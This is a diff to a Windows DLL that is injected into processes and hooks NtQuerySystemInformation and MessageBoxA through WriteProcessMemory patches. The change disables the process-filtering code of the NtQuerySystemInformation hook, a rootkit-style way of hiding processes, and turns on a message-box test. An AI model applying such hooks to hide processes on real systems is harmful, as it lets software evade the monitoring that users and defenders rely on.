@@ -208,13 +208,14 @@ int WINAPI nMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)
 
 DWORD WINAPI NtQuerySystemInformationHOOK(DWORD SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
+    return 0;
     //unhook
     WriteProcessMemory(GetCurrentProcess(), (void*)NtQuerySystemInformationAddr, hook, 6, 0);
     PSYSTEM_PROCESS_INFORMATION pSpiCurrent, pSpiPrec;
     char *pname = NULL;
     DWORD rc = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
     // Success? 
-    if (rc == 0)
+    /*if (rc == 0)
     {
         switch (SystemInformationClass)// querying for processes?
         {
@@ -265,7 +266,7 @@ DWORD WINAPI NtQuerySystemInformationHOOK(DWORD SystemInformationClass, PVOID Sy
             break;
         }
     }
-    NtQuerySystemInformationAddr = UnHookFunction("ntdll.dll", "NtQuerySystemInformation", hook);
+    NtQuerySystemInformationAddr = UnHookFunction("ntdll.dll", "NtQuerySystemInformation", hook);*/
     return (rc);
 }
 
@@ -275,7 +276,7 @@ INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
     
     char buffer[64];
     wsprintf(buffer, "Injected on process %d", procID);
-    int messageBoxTest = 3;
+    int messageBoxTest = 1;
     if (messageBoxTest == 1)
     {
         HookFunction("user32.dll", "MessageBoxA", nMessageBox, hook);
